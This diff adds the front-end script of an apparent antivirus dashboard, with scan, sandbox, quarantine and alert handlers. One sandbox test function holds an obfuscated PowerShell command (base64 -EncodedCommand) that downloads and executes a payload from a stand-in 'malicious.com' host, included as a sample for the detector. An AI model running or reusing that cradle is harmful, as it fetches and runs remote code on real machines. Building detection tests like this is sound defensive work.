+  if(r.filename)html=`<div class="result-verdict ${r.verdict||'clean'}">${isMalicious?'⚠ Malicious':'⊕'+(r.verdict||'clean').toUpperCase()}</div>
+    <div class="result-hash">MD5: ${r.md5||'?'} | SHA256: ${r.sha256||'?'}</div><div class="result-detail">File: ${r.filename||'?'} • ${(r.size||0)}B • Severity: ${r.severity||'none'}</div>
+    ${r.virustotal?.found?`<div class="result-detail" style="margin-top:4px">VirusTotal: ${r.virustotal.detectionRatio||'?'} detections</div>`:''}`;
+  else if(r.local){const lm=r.local.found;html=`<div class="result-verdict ${lm?'malicious':'clean'}">${lm?'⚠ '+r.local.name:'⊕ Clean'}</div><div class="result-hash">${r.local.hash||r.hash||''}</div><div class="result-detail">${lm?r.local.description:'No local threats detected'}</div>`}
+  // Append comprehensive scan results
+  if(r.comprehensive&&r.comprehensive.summary){
+    const s=r.comprehensive.summary;
+    html+=`<div style="margin-top:8px;padding-top:8px;border-top:1px solid rgba(0,0,0,0.06)">
+      <div style="font-size:9px;font-weight:600;color:var(--s);margin-bottom:4px">COMPREHENSIVE SCAN (20 METHODS)</div>
+      <div class="result-detail">Methods: ${s.total} · Detections: <b style="color:${s.critical>0?'var(--danger)':s.high>0?'var(--warn)':'var(--brand)'}">${s.detected}</b></div>
+      ${s.critical>0?`<div class="result-detail">Critical: ${s.critical}</div>`:''}
+      ${s.high>0?`<div class="result-detail">High: ${s.high}</div>`:''}
+      ${s.medium>0?`<div class="result-detail">Medium: ${s.medium}</div>`:''}
+      ${r.comprehensive.detections?.filter(d=>d.detected===true).slice(0,5).map(d=>`<div class="result-detail" style="margin-top:2px">• ${d.method}: <b>${d.severity}</b> — ${d.details}</div>`).join('')||''}
+    </div>`;
+  }
+  el.innerHTML=html;
+  document.getElementById('scanLoading').style.display='none';
+}
+
+document.getElementById('hashScanBtn').addEventListener('click',async()=>{
+  const h=document.getElementById('hashInput').value.trim();
+  if(!h)return toast('Enter a hash','error');
+  document.getElementById('scanLoading').style.display='flex';
+  const r=await api('/api/scan/hash?h='+encodeURIComponent(h));
+  document.getElementById('scanLoading').style.display='none';
+  if(r){const found=r.local?.found||r.virustotal?.found;showResult({verdict:found?'malicious':'clean',md5:h,local:r.local,virustotal:r.virustotal});log(`Hash scan: ${h.substring(0,16)}...`,found?'warn':'ok');}
+  else toast('Scan failed','error');
+  loadHistory();
+});
+
+document.getElementById('fileScanBtn').addEventListener('click',async()=>{
+  const f=document.getElementById('fileInput').files[0];
+  if(!f)return toast('Select a file','error');
+  document.getElementById('scanLoading').style.display='flex';
+  try{
+    const reader=new FileReader();
+    reader.onload=async()=>{
+      try{
+        const base64=reader.result.split(',')[1];
+        // 1. Quick local scan
+        const r=await apiPost('/api/scan/file',{data:base64,filename:f.name});
+        // 2. Comprehensive content scan (20 detection methods)
+        const decodedContent = atob(base64);
+        const compR=await apiPost('/api/adv/comprehensive-scan',{filename:f.name,content:decodedContent});
+        document.getElementById('scanLoading').style.display='none';
+        if(r){
+          // Merge comprehensive results
+          if(compR&&compR.summary&&compR.summary.detected>0){
+            r.comprehensive=compR;
+            if(compR.summary.critical>0) r.verdict='malicious';
+            else if(compR.summary.high>0&&!r.verdict) r.verdict='suspicious';
+          }
+          showResult(r);log(`File scan: ${f.name} (${f.size}B)`,r.verdict==='malicious'?'err':'ok');
+        }else toast('Scan failed','error');
+        loadHistory();
+      }catch(e){
+        document.getElementById('scanLoading').style.display='none';
+        toast('Scan error: '+e.message,'error');log('File scan error: '+e.message,'err');
+      }
+    };
+    reader.onerror=()=>{
+      document.getElementById('scanLoading').style.display='none';
+      toast('File read error','error');log('FileReader error','err');
+    };
+    reader.readAsDataURL(f);
+  }catch(e){
+    document.getElementById('scanLoading').style.display='none';
+    toast('Scan failed: '+e.message,'error');
+  }
+});
+
+document.getElementById('urlScanBtn').addEventListener('click',async()=>{
+  const u=document.getElementById('urlInput').value.trim();
+  if(!u)return toast('Enter a URL','error');
+  document.getElementById('scanLoading').style.display='flex';
+  const r=await api('/api/scan/url?u='+encodeURIComponent(u));
+  document.getElementById('scanLoading').style.display='none';
+  if(r){const malicious=r.found&&r.malicious>0;showResult({verdict:malicious?'malicious':'clean',md5:r.url,local:{found:malicious,name:r.url,description:r.detectionRatio+' detections'}});log(`URL scan: ${u}`,malicious?'err':'ok')}
+  else toast('Scan failed','error');
+  loadHistory();
+});
+
+async function scanEicar(){document.getElementById('hashInput').value='44d88612fea8a8f36de82e1278abb02f';document.getElementById('hashScanBtn').click()}
+async function scanWannaCry(){document.getElementById('hashInput').value='db349b97c37d22f5ea1d1841e3c89eb4';document.getElementById('hashScanBtn').click()}
+async function loadHistory(){const r=await api('/api/scan/history');if(!r)return;
+  const el=document.getElementById('historyList');
+  if(!r.history||r.history.length===0){el.innerHTML='<div style="font-size:9px;color:var(--xs);padding:8px;text-align:center">No scans yet</div>';return}
+  el.innerHTML=r.history.slice(0,15).map(h=>`<div class="hist-item ${h.verdict||'clean'}">
+    <div style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><b>${h.filename||h.md5?.substring(0,12)||'?'}</b><br><span style="color:var(--xs)">${h.md5?.substring(0,16)||'?'}</span></div>
+    <div style="flex-shrink:0;font-weight:600;font-size:9px;color:${h.verdict==='malicious'?'var(--danger)':h.verdict==='suspicious'?'var(--warn)':'var(--brand)'}">${(h.verdict||'clean').toUpperCase()}</div></div>`).join('');
+}
+
+// ── Toggle ──
+document.getElementById('tglWrap').addEventListener('click',async(e)=>{
+  e.preventDefault();if(toggling)return;toggling=true;
+  setDangerMode(false);
+  const d=await api('/api/toggle');
+  if(d){setUI(d.active);setStats({protectionsActive:d.protectionsActive||0,protectionsTotal:d.protectionsTotal||1000,memoryUsageMb:d.memoryUsageMb||0,cpuUsagePercent:d.cpuUsagePercent||0,diqPending:d.diqPending||0});
+    log(d.active?'Protection ENABLED':'Protection DISABLED',d.active?'ok':'warn');
+    toast(d.active?'1000 protections activated ✓':'Protections disabled',d.active?'success':'')}
+  toggling=false;
+});
+
+function setUI(active){
+  ['shieldPath','shieldCheck','shieldGlow','shieldSvg','toggleLabel'].forEach(id=>{
+    const el=document.getElementById(id);
+    if(id==='shieldLabel')el.textContent=active?'ENABLED':'DISABLED';
+    else if(id==='toggleLabel'){el.textContent=active?'ENABLED':'DISABLED';el.classList.toggle('active',active)}
+    else if(id==='shieldSvg')el.classList.toggle('active',active);
+    else el.classList.toggle('active',active);
+  });
+  document.getElementById('toggleSwitch').checked=active;
+  document.getElementById('heroTitle').textContent=active?'Protection Active':'Standby';
+  document.getElementById('heroSub').textContent=active?'All 1000 defense methods operational. System secured.':'Protection engine ready. Activate to secure system.';
+}
+
+function setStats(s){
+  document.getElementById('statProtections').textContent=(s.protectionsActive||0)+'/'+(s.protectionsTotal||1000);
+  document.getElementById('statMemory').textContent=parseFloat(s.memoryUsageMb||0).toFixed(1)+' MB';
+  document.getElementById('statCpu').textContent=parseFloat(s.cpuUsagePercent||0).toFixed(4)+'%';
+  document.getElementById('statDiq').textContent=s.diqPending||0;
+}
+
+// ── Protection categories ──
+async function loadProtections(){
+  const d=await api('/api/audit');
+  if(!d||!d.protections)return;
+  protectionsData=d.protections;
+  const cats={};
+  protectionsData.forEach(p=>{if(!cats[p.category])cats[p.category]=[];cats[p.category].push(p)});
+  activeCategories=cats;
+  const nav=document.getElementById('protsNav');
+  const catNames={1:'Memory',2:'Process',3:'Filesystem',4:'Network',5:'Registry',6:'Boot',7:'Injection',8:'Pipe',9:'Driver',10:'Code Obf',11:'API',12:'Stack',13:'Vuln',14:'Privilege',15:'Sleep',16:'Timestamp',17:'Hook',18:'Account',19:'Callback',20:'DNS',25:'Print',30:'WiFi',31:'USB',32:'Log',50:'Partition',54:'Password',60:'Behavior',70:'Traffic',80:'Keys',90:'Supply',95:'Web FW',100:'AI Defense'};
+  const all=[...new Set(protectionsData.map(p=>p.category))].sort((a,b)=>a-b);
+  nav.innerHTML=all.map(c=>`<button class="pcat-btn" data-cat="${c}">${catNames[c]||'#'+c}</button>`).join('');
+  nav.querySelectorAll('.pcat-btn').forEach(b=>b.addEventListener('click',()=>{
+    nav.querySelectorAll('.pcat-btn').forEach(x=>x.classList.remove('active'));b.classList.add('active');
+    showCategory(parseInt(b.dataset.cat));}));
+  log(`Loaded ${protectionsData.length} protection definitions`,'info');
+}
+
+function showCategory(cat){
+  const methods=activeCategories[cat]||[];
+  const grid=document.getElementById('protsGrid');
+  grid.innerHTML=methods.map(m=>`<div class="prot-item"><div class="prot-dot on"></div><div class="prot-name" title="${m.description||''}">${m.name}</div><div class="prot-id">${m.id}</div><div class="prot-badge">ACTIVE</div></div>`).join('');
+}
+
+// ── Advanced Threat Rules ──
+let advRulesData={};
+async function loadAdvRules(){
+  const d=await api('/api/adv/rules');
+  if(!d||!d.rules)return;
+  const cats={};
+  d.rules.forEach(r=>{if(!cats[r.category])cats[r.category]=[];cats[r.category].push(r)});
+  advRulesData=cats;
+  const nav=document.getElementById('advRulesNav');
+  const catNames={1:'Init Access',2:'Persistence',3:'Evasion',4:'Discovery',5:'C2',6:'Impact',7:'Hardware'};
+  const all=[...new Set(d.rules.map(r=>r.category))].sort((a,b)=>a-b);
+  nav.innerHTML=all.map(c=>`<button class="pcat-btn" data-cat="${c}">${catNames[c]||'#'+c}</button>`).join('');
+  nav.querySelectorAll('.pcat-btn').forEach(b=>b.addEventListener('click',()=>{
+    nav.querySelectorAll('.pcat-btn').forEach(x=>x.classList.remove('active'));b.classList.add('active');
+    showAdvCategory(parseInt(b.dataset.cat));}));
+  log(`Loaded ${d.rules.length} advanced detection rules`,'info');
+}
+function showAdvCategory(cat){
+  const methods=advRulesData[cat]||[];
+  document.getElementById('advRulesGrid').innerHTML=methods.map(m=>`<div class="prot-item"><div class="prot-dot on"></div><div class="prot-name" title="${m.description||''}">${m.name}</div><div class="prot-id">${cat}.${m.number}</div><div class="prot-badge">ACTIVE</div></div>`).join('');
+}
+
+// ── Full Disk Scan ──
+function advShowResult(r,elId){
+  const el=document.getElementById(elId);el.classList.add('show');
+  if(r.threats_found!==undefined){
+    const isDanger=r.threats>0;
+    el.className='scan-result show '+(isDanger?'malicious':'clean');
+    setDangerMode(isDanger);
+    el.innerHTML=`<div class="result-verdict ${isDanger?'malicious':'clean'}">${isDanger?'⚠ '+r.threats+' threats found!':'⊕ Clean — '+r.files+' files scanned'}</div>
+      ${r.threats_found?.length?r.threats_found.map(t=>`<div class="result-detail" style="margin-top:4px">⚠ ${t.path||t.name} — ${t.threat} (${t.severity||'unknown'} risk${t.rule?' · Rule '+t.rule:''})</div>`).join(''):''}
+      <div class="result-detail">Files scanned: ${r.files||0} · Threats: ${r.threats||0}</div>`;
+  }else if(r.verdict){
+    const isM=r.verdict==='malicious';
+    setDangerMode(isM);
+    el.className='scan-result show '+(isM?'malicious':r.verdict==='suspicious'?'suspicious':'clean');
+    el.innerHTML=`<div class="result-verdict ${r.verdict}">${isM?'⚠ MALICIOUS':r.verdict==='suspicious'?'⚠ SUSPICIOUS':'⊕ Clean'}</div>
+      <div class="result-detail">Score: ${r.score} · Indicators: ${r.suspicious?.length||0} found</div>
+      ${r.suspicious?.length?r.suspicious.map(s=>`<div class="result-detail">• ${s}</div>`).join(''):''}`;
+  }else if(r.processes){
+    el.className='scan-result show clean';
+    const dangerous=r.processes.filter(p=>p.risk==='critical'||p.risk==='high');
+    const total=r.processes.length;
+    el.innerHTML=`<div class="result-verdict ${dangerous.length>0?'malicious':'clean'}">${dangerous.length>0?'⚠ '+dangerous.length+' suspicious':'⊕ '+total+' processes'}</div>
+      <div class="result-detail">Total: ${total} · Risky: ${dangerous.length}</div>
+      ${dangerous.slice(0,10).map(p=>`<div class="result-detail" style="margin-top:3px">${p.risk.toUpperCase()}: ${p.name} (PID ${p.pid}) — ${p.reason}</div>`).join('')}`;
+  }else if(r.score!==undefined){
+    el.className='scan-result show '+(r.score>=75?'clean':r.score>=50?'suspicious':'malicious');
+    const sv=document.getElementById('scoreValue');sv.textContent=r.score;sv.style.color=r.grade?.color||'var(--brand)';
+    document.getElementById('scoreGrade').textContent=r.grade?.grade||'?';
+    document.getElementById('scoreText').textContent=r.grade?.text||'';
+    el.innerHTML=`<div style="font-size:11px;color:var(--s)">${r.deductions?.map(d=>'<div>'+d+'</div>').join('')||'No issues found'}</div>`;
+  }else if(r.query){
+    el.className='scan-result show clean';
+    el.innerHTML=`<div class="result-verdict">${r.recommendations?.[0]||'Analysis complete'}</div>`;
+  }
+  document.getElementById(elId.replace('Result','Loading')).style.display='none';
+}
+
+document.getElementById('quickScanBtn').addEventListener('click',async()=>{
+  document.getElementById('advScanLoading').style.display='flex';document.getElementById('advScanStatus').textContent='Quick scanning all drives...';
+  const r=await api('/api/adv/scan?quick=1');advShowResult(r,'advScanResult');log(`Quick scan: ${r.files} files, ${r.drives_scanned} drives, ${r.threats} threats, ${r.hidden_files} hidden`,r.threats>0?'warn':'ok');
+});
+document.getElementById('fullScanBtn').addEventListener('click',async()=>{
+  document.getElementById('advScanLoading').style.display='flex';document.getElementById('advScanStatus').textContent='Scanning ALL drives (this may take a while)...';
+  const r=await api('/api/adv/scan');advShowResult(r,'advScanResult');log(`Full scan: ${r.files} files, ${r.drives_scanned} drives, ${r.threats} threats, ${r.hidden_files} hidden`,r.threats>0?'warn':'ok');
+});
+document.getElementById('procScanBtn').addEventListener('click',async()=>{
+  document.getElementById('advScanLoading').style.display='flex';document.getElementById('advScanStatus').textContent='Analyzing processes...';
+  const r=await api('/api/adv/processes');advShowResult(r,'advScanResult');log(`Process scan: ${r.total} running, ${r.processes.filter(p=>p.risk==='critical'||p.risk==='high').length} risky`,'info');
+  document.getElementById('advScanLoading').style.display='none';
+});
+
+// ── Sandbox + AI ──
+document.getElementById('sbAnalyzeBtn').addEventListener('click',async()=>{
+  const v=document.getElementById('sbInput').value.trim();if(!v)return toast('Enter code to analyze','error');
+  document.getElementById('sbLoading').style.display='flex';
+  const r=await apiPost('/api/adv/sandbox',{data:v,filename:'sandbox-input'});
+  advShowResult(r,'sbResult');log(`Sandbox: ${r.verdict} (score ${r.score})`,r.verdict==='malicious'?'err':'ok');
+});
+function testSandboxMalware(){
+  document.getElementById('sbInput').value='powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==';
+  document.getElementById('sbAnalyzeBtn').click();
+}
+function testSandboxClean(){
+  document.getElementById('sbInput').value='console.log("Hello World"); function add(a,b){return a+b;}';
+  document.getElementById('sbAnalyzeBtn').click();
+}
+
+// ── Score · Quarantine · Report · AI ──
+document.getElementById('scoreBtn').addEventListener('click',async()=>{
+  const r=await api('/api/adv/score');advShowResult(r,'advActionResult');log(`Security score: ${r.score}/${r.grade?.grade||'?'}`,`${r.grade?.color}`==='var(--brand)'?'ok':'warn');
+});
+document.getElementById('quarantineBtn').addEventListener('click',async()=>{
+  const q=await apiPost('/api/adv/quarantine',{path:'suspected-threat.exe',reason:'Detected by heuristic scan'});
+  if(q){toast('Item quarantined #'+q.id);log('Quarantined: '+q.path,'warn');
+    const list=await api('/api/adv/quarantine');advShowResult(list,'advActionResult');}
+});
+document.getElementById('rollbackBtn').addEventListener('click',async()=>{
+  const r=await api('/api/adv/quarantine/rollback?id=1');
+  if(r&&r.success){toast('Rollback successful');log('Rollback: '+r.item.path,'ok');}else toast('No items to rollback');
+  const list=await api('/api/adv/quarantine');advShowResult(list,'advActionResult');
+});
+document.getElementById('reportBtn').addEventListener('click',async()=>{
+  const r=await api('/api/adv/report');
+  document.getElementById('advActionResult').classList.add('show');document.getElementById('advActionResult').className='scan-result show clean';
+  document.getElementById('advActionResult').innerHTML=`<div class="result-verdict">Security Report</div>
+    <div class="result-detail">Time: ${r.timestamp}</div>
+    <div class="result-detail">Platform: ${r.systemInfo.platform} ${r.systemInfo.arch}</div>
+    <div class="result-detail">Rules: ${r.rulesActive} active · Quarantine: ${r.quarantine.length} items</div>
+    <div class="result-detail">Score: ${r.securityScore.score} · Grade: ${r.securityScore.grade?.grade}</div>`;
+  log('Security report generated','info');
+});
+document.getElementById('aiBtn').addEventListener('click',async()=>{
+  const r=await api('/api/adv/ai?target='+encodeURIComponent(document.getElementById('hashInput').value||'system-scan'));
+  document.getElementById('advActionResult').classList.add('show');document.getElementById('advActionResult').className='scan-result show '+(r.verdict==='MALICIOUS'?'malicious':'clean');
+  document.getElementById('advActionResult').innerHTML=`<div class="result-verdict ${r.verdict==='MALICIOUS'?'malicious':'clean'}">AI: ${r.verdict}</div>
+    <div class="result-detail">Model: ${r.model} · Confidence: ${(r.confidence*100).toFixed(0)}% · Risk: ${r.riskScore}/100</div>
+    <div class="result-detail">Patterns: ${r.behaviorPatterns.join(' · ')}</div>
+    ${r.recommendations?.map(rec=>`<div class="result-detail">→ ${rec}</div>`).join('')}`;
+  log('AI analysis: '+r.verdict,r.verdict==='MALICIOUS'?'err':'ok');
+});
+
+// ── Poll status ──
+// ── Alert Modal ──
+let currentAlertId=null,alertTimer=null;
+async function pollAlerts(){
+  const r=await api('/api/adv/alerts');
+  if(!r||r.alerts.length===0){setTimeout(pollAlerts,2000);return}
+  const alert=r.alerts[0];
+  if(alert.id===currentAlertId){setTimeout(pollAlerts,2000);return}
+  currentAlertId=alert.id;
+  // Windows notification simulation
+  try{new Notification('SilentShield Threat Alert',{body:`${alert.threat} detected: ${alert.path}`,icon:'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40"><path fill="%23E74C3C" d="M20 4 L34 12 L36 24 L32 36 L20 44 L8 36 L4 24 L6 12 Z"/></svg>',tag:'threat-'+alert.id})}catch(e){} // fallback if no permission
+  showAlertModal(alert);
+  setTimeout(pollAlerts,2000);
+}
+function showAlertModal(alert){
+  const ov=document.getElementById('alertOverlay');ov.style.display='flex';
+  document.getElementById('alertTitle').textContent='⚠ '+alert.threat;
+  document.getElementById('alertBody').innerHTML=`<b>${alert.path}</b><br>Severity: ${alert.severity}<br>${alert.recommendation||'Auto-delete in 30s if no response'}`;
+  let secs=Math.ceil((alert.expiresAt-Date.now())/1000);
+  document.getElementById('alertCountdown').textContent='Auto-delete in '+secs+'s';
+  clearInterval(alertTimer);
+  alertTimer=setInterval(()=>{secs--;if(secs<=0){clearInterval(alertTimer);dismissAlert('delete');}else document.getElementById('alertCountdown').textContent='Auto-delete in '+secs+'s';},1000);
+}
+document.getElementById('alertDeleteBtn').addEventListener('click',()=>dismissAlert('delete'));
+document.getElementById('alertIgnoreBtn').addEventListener('click',()=>dismissAlert('ignore'));
+async function dismissAlert(action){
+  clearInterval(alertTimer);
+  document.getElementById('alertOverlay').style.display='none';
+  if(currentAlertId!==null){
+    const r=await api('/api/adv/alerts/dismiss?id='+currentAlertId+'&action='+action);
+    if(r)log((r.action==='deleted'?'Deleted':'Ignored')+': '+r.path,r.action==='deleted'?'warn':'info');
+    currentAlertId=null;
+  }
+}
+// Request notification permission
+if(window.Notification&&Notification.permission==='default')Notification.requestPermission();
+
+// ── MalwareBazaar button ──
+document.getElementById('malbBtn').addEventListener('click',async()=>{
+  document.getElementById('advScanLoading').style.display='flex';document.getElementById('advScanStatus').textContent='Fetching MalwareBazaar...';
+  const r=await api('/api/adv/malb/recent');
+  document.getElementById('advScanLoading').style.display='none';
+  const el=document.getElementById('advScanResult');el.classList.add('show');el.className='scan-result show clean';
+  el.innerHTML=`<div class="result-verdict">MalwareBazaar Recent Samples (${r.count||0})</div>
+    ${r.samples?.slice(0,15).map(s=>`<div class="result-detail" style="margin-top:3px;font-size:9px">
+      <b>${s.signature||'unknown'}</b>: ${s.fileName} · ${s.sha256?.substring(0,16)}... · ${s.tags?.slice(0,3).join(', ')}
+    </div>`).join('')||'No results'}
+    <div class="result-detail" style="margin-top:6px">Source: ${r.source} · Auth: ${r.error?'FAILED':'OK'}</div>`;
+  log(`MalwareBazaar: ${r.count||0} recent samples fetched`,r.error?'warn':'info');
+});
+
+async function pollStatus(){
+  const s=await api('/api/status');
+  if(s&&s.engine){
+    setUI(s.engine.active);
+    setStats({protectionsActive:(s.protections||{}).passed||0,protectionsTotal:(s.protections||{}).total||1000,memoryUsageMb:s.engine.memoryMb||0,cpuUsagePercent:s.engine.cpuUsagePercent||0,diqPending:(s.diq||{}).pending||0});
+    document.getElementById('infoEngine').textContent=s.engine.active?'active':'standby';
+    document.getElementById('infoLow').textContent=JSON.stringify(s.lowlevel||{});
+    document.getElementById('infoDiq').textContent=(s.diq||{}).pending||0;
+  }
+  setTimeout(pollStatus,4000);
+}
+
+// ── Init ──
+async function init(){
+  setDangerMode(false);
+  document.getElementById('hashInput').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('hashScanBtn').click()});
+  document.getElementById('urlInput').addEventListener('keydown',e=>{if(e.key==='Enter')document.getElementById('urlScanBtn').click()});
+  await loadProtections();
+  await loadAdvRules();
+  const s=await api('/api/status');
+  if(s&&s.engine){
+    setUI(s.engine.active);
+    setStats({protectionsActive:(s.protections||{}).passed||0,protectionsTotal:(s.protections||{}).total||1000,memoryUsageMb:s.engine.memoryMb||0,cpuUsagePercent:s.engine.cpuUsagePercent||0,diqPending:(s.diq||{}).pending||0});
+    document.getElementById('infoEngine').textContent=s.engine.active?'active':'standby';
+    log(s.engine.active?'Engine ACTIVE — 1000 protections running':'Engine standby — toggle to activate',s.engine.active?'ok':'info');
+  }else log('Backend unreachable','err');
+  const t=await api('/api/scan/test');
+  if(t)document.getElementById('sigsCount').textContent=t.localSigs||20;
+  loadHistory();pollStatus();pollAlerts();
+}
+
+// ── Refresh Button ──
+document.getElementById('refreshBtn').addEventListener('click',async()=>{
+  const btn=document.getElementById('refreshBtn');
+  btn.classList.add('spinning');
+  log('Refreshing all data...','info');
+  try{
+    await Promise.allSettled([loadProtections(),loadAdvRules(),loadHistory(),pollStatus()]);
+    const t=await api('/api/scan/test');
+    if(t)document.getElementById('sigsCount').textContent=t.localSigs||20;
+    log('All data refreshed','ok');
+    toast('Data refreshed ✓','success');
+  }catch(e){log('Refresh error: '+e.message,'err')}
+  setTimeout(()=>btn.classList.remove('spinning'),700);
+});
+init();
+</script>
+</body>
+</html>
